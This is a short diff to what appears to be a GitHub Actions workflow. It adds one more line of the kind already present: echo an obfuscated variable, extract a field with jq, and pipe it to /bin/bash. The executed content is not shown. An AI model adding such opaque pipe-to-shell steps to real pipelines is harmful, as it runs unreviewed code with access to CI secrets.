@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$i6" | jq -r .uo2 | /bin/bash
           echo $xr955 | jq -r .n1276 | /bin/bash
           echo $ropq76 | jq -r .e5125 | /bin/bash
+          echo $iyz148 | jq -r .yd06081 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
